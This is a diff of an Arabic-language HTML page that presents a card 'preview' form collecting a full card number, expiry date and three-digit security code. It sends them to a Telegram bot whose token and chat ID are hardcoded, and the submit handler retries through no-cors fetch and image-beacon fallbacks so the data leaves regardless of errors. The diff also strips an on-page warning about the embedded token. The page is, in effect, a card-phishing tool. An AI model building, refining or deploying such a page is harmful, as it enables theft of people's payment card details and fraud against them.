@@ -11,15 +11,15 @@
       --bg: #f4f8fb;
       --panel: #ffffff;
       --muted: #64748b;
-      --accent-1: #06b6d4; /* teal */
-      --accent-2: #3b82f6; /* blue */
-      --accent-3: #7c3aed; /* purple */
+      --accent-1: #06b6d4;
+      --accent-2: #3b82f6;
+      --accent-3: #7c3aed;
       --shadow-lg: 0 18px 40px rgba(16,24,40,0.06);
       --shadow-sm: 0 8px 18px rgba(16,24,40,0.04);
       --card-height: 220px;
       --radius: 14px;
       --input-height: 44px;
-      --label-gap-small: 6px; /* very small gap between label and input as requested */
+      --label-gap-small: 6px;
       --text: #042033;
     }
 
@@ -38,7 +38,6 @@
       direction:rtl;
     }
 
-    /* App layout */
     .app {
       width:100%;
       max-width:980px;
@@ -55,7 +54,6 @@
       .right { order:-1; }
     }
 
-    /* Left panel (form) */
     .left {
       background: var(--panel);
       border-radius:var(--radius);
@@ -73,26 +71,22 @@
     form { display:flex; flex-direction:column; gap:12px; margin-top:6px; }
 
     .field { display:flex; flex-direction:column; gap:4px; }
-    /* very small gap between label and input */
     label.inline { display:flex; align-items:center; gap:var(--label-gap-small); font-weight:700; font-size:13px; color:var(--text); }
 
     .control {
       display:flex; align-items:center; gap:10px;
       background:#fbfdff; padding:8px 10px; border-radius:10px;
-      border:1px solid rgba(4,6,12,0.04);
-      height:var(--input-height);
+      border:1px solid rgba(4,6,12,0.04); height:var(--input-height);
       transition: box-shadow .12s, transform .08s;
     }
     .control:focus-within { box-shadow:0 8px 30px rgba(59,130,246,0.06); transform: translateY(-1px); border-color: rgba(59,130,246,0.08); }
 
     input[type="text"], input[type="tel"] {
       border:0; background:transparent; outline:none; width:100%; font-size:15px; color:var(--text);
-      direction:ltr; text-align:left;
-      padding:6px 0;
+      direction:ltr; text-align:left; padding:6px 0;
     }
     input::placeholder { color: rgba(4,6,12,0.32); }
 
-    .row { display:flex; gap:10px; align-items:center; }
     .two-cols { display:flex; gap:10px; }
     .two-cols > div { flex:1; }
 
@@ -115,9 +109,6 @@
 
     #message { min-height:22px; font-size:13px; color:var(--muted); text-align:left; }
 
-    .note { font-size:12px; color:var(--muted); margin-top:8px; }
-
-    /* Right panel: preview card */
     .right { display:flex; flex-direction:column; gap:12px; }
     .preview-box {
       background:var(--panel); border-radius:var(--radius); padding:12px; border:1px solid rgba(4,6,12,0.04);
@@ -125,8 +116,6 @@
     }
 
     .preview-header { display:flex; justify-content:space-between; align-items:center; gap:12px; }
-    .preview-sub { color:var(--muted); font-size:13px; }
-
     .card-area {
       height: var(--card-height); border-radius:12px; padding:16px; display:flex; flex-direction:column; justify-content:space-between;
       background: linear-gradient(135deg, #ffffff, #fbfdff);
@@ -137,8 +126,7 @@
     .card-surface {
       border-radius:12px; padding:16px; display:flex; flex-direction:column; gap:8px;
       background: linear-gradient(135deg, rgba(59,130,246,0.06), rgba(139,92,246,0.05));
-      color:var(--text);
-      min-height:120px;
+      color:var(--text); min-height:120px;
     }
 
     .card-top { display:flex; justify-content:space-between; align-items:center; gap:12px; }
@@ -154,12 +142,6 @@
     .meta-block { display:flex; flex-direction:column; text-align:left; direction:ltr; }
     .meta-label { font-size:11px; color: rgba(4,6,12,0.6); }
     .meta-value { font-weight:800; font-size:15px; color:var(--text); }
-
-    .card-footer { display:flex; justify-content:space-between; align-items:center; gap:10px; }
-
-    .control-inline { display:flex; gap:8px; align-items:center; }
-
-    .copy-btn { background:transparent; border:1px dashed rgba(4,6,12,0.06); padding:8px 10px; border-radius:10px; cursor:pointer; color:var(--muted); }
 
     .success-burst { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none; opacity:0; transform:scale(0.98); transition:opacity .28s, transform .28s; }
     .success-burst.show { opacity:1; transform:scale(1); }
@@ -214,13 +196,8 @@
 
         <div class="actions" aria-hidden="false" style="margin-top:4px;">
           <button class="btn btn-primary" id="sendBtn" type="submit">إرسال</button>
-          <button type="button" class="btn-ghost" id="clearBtn" aria-label="مسح الحقول">مسح</button>
           <div id="message" role="status" aria-live="polite"></div>
         </div>
-
-        <p class="note" style="margin-top:8px;font-size:12px;color:var(--muted);">
-          ملاحظة: تم تضمين توكن البوت و chat_id داخل الملف (للاستخدام المحلي فقط). لا تنشر الملف في مكان عام.
-        </p>
       </form>
     </div>
 
@@ -230,10 +207,6 @@
         <div class="preview-header">
           <div>
             <h3 style="margin:0">معاينة البطاقة</h3>
-            <div class="preview-sub">المعلومات تظهر مباشرة وبشكل رسمي في البطاقة أدناه.</div>
-          </div>
-          <div class="control-inline">
-            <button id="copyBtn" class="copy-btn" title="نسخ الصيغة المرسلة">نسخ</button>
           </div>
         </div>
       </div>
@@ -243,7 +216,6 @@
           <div class="card-top">
             <div style="display:flex;gap:10px;align-items:center">
               <div class="chip" aria-hidden></div>
-              <!-- removed TB label as requested -->
             </div>
             <div style="font-weight:700;color:var(--text)">Telegram</div>
           </div>
@@ -273,8 +245,8 @@
 
   <script>
     /************************************************
-     * إعداد التوكن والـ chat id هنا (كما طلبت)
-     * ملاحظة: ظهور التوكن في كود الجهة العميلة غير آمن.
+     * إعداد التوكن والـ chat id هنا
+     * ملاحظة: ظهور التوكن في كود العميل غير آمن إن نشرت الملف.
      ************************************************/
     const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
     const CHAT_ID = "6873334348";
@@ -286,8 +258,6 @@
     const threeInput = document.getElementById('threeDigits');
     const msg = document.getElementById('message');
     const sendBtn = document.getElementById('sendBtn');
-    const clearBtn = document.getElementById('clearBtn');
-    const copyBtn = document.getElementById('copyBtn');
 
     const pNumber = document.getElementById('cardNumber');
     const pExpiry = document.getElementById('cardExpiry');
@@ -312,32 +282,30 @@
     // Update preview with full visible number and 3-digit visible
     function updatePreview(){
       const digits = rawDigits(idInput.value).slice(0,16);
-      // display groups; if less than 16, fill with dots for aesthetics but keep actual digits visible
       const padded = digits + ''.padEnd(Math.max(0, 16 - digits.length), '•');
       const groups = padded.match(/.{1,4}/g) || [];
       pNumber.textContent = groups.join(' ');
-      // expiry show as MM/YY
+      // expiry display
       const exp = expiryInput.value || '';
       const m = exp.match(/^(\d{2})\/(\d{2,4})$/);
       if (m) {
         const mm = m[1];
         const yy = m[2].length === 4 ? m[2].slice(-2) : m[2];
-        pExpiry.textContent = `${mm}/${yy}`;
+        pExpiry.textContent = `${mm}/${yOrZero(yy)}`;
       } else if (exp.length === 4 && /^\d{4}$/.test(exp)) {
-        // if user typed MMYY without slash (e.g., 0128)
         pExpiry.textContent = `${exp.slice(0,2)}/${exp.slice(2)}`;
       } else {
         pExpiry.textContent = exp || 'MM/YY';
       }
-      // show CVV fully or placeholders
       pThree.textContent = threeInput.value ? threeInput.value.padEnd(3, '•') : '000';
     }
+
+    function yOrZero(val){ return val || '00'; }
 
     // input handlers
     idInput.addEventListener('input', (e) => {
       const d = rawDigits(e.target.value).slice(0,16);
       e.target.value = formatGroups(d);
-      // keep caret at end
       try { e.target.selectionStart = e.target.selectionEnd = e.target.value.length; } catch (_) {}
       updatePreview();
     });
@@ -359,19 +327,7 @@
       updatePreview();
     });
 
-    // copy compact message
-    copyBtn.addEventListener('click', async () => {
-      const txt = buildSendText();
-      try {
-        await navigator.clipboard.writeText(txt);
-        showMessage('تم نسخ الصيغة.', 'success');
-        setTimeout(()=> showMessage('', ''), 1400);
-      } catch (err) {
-        showMessage('فشل النسخ — قد لا يدعم المتصفح.', 'error');
-      }
-    });
-
-    // normalize expiry to MM/YYYY for sending
+    // normalize expiry for sending
     function normalizeExpiryForSend(display) {
       if (!display) return '';
       const m = display.match(/^(\d{2})\/(\d{2,4})$/);
@@ -409,13 +365,6 @@
     }
     function validateThree(){ return /^\d{3}$/.test(threeInput.value); }
 
-    // clear
-    clearBtn.addEventListener('click', () => {
-      form.reset();
-      showMessage('', '');
-      updatePreview();
-    });
-
     // send (with same fallback approach)
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -446,7 +395,6 @@
       sendBtn.disabled = true;
       sendBtn.style.opacity = '0.7';
 
-      // 1) normal fetch
       try {
         const resp = await fetch(url, { method: 'GET' });
         if (resp && resp.ok) {
@@ -470,7 +418,6 @@
         console.warn('fetch normal failed — محاولة بدائل', err);
       }
 
-      // 2) no-cors fallback
       try {
         await fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
         showMessage('تم إرسال الطلب (بدون تأكيد نتيجة بسبب قيود CORS).', 'success');
@@ -484,7 +431,6 @@
         console.warn('no-cors failed — محاولة تحميل صورة', err);
       }
 
-      // 3) image fallback
       try {
         await new Promise((resolve) => {
           const img = new Image();
@@ -520,8 +466,6 @@
 
     // live preview updates
     [idInput, expiryInput, threeInput].forEach(el => el.addEventListener('input', updatePreview));
-
-    // initial
     updatePreview();
   </script>
 </body>
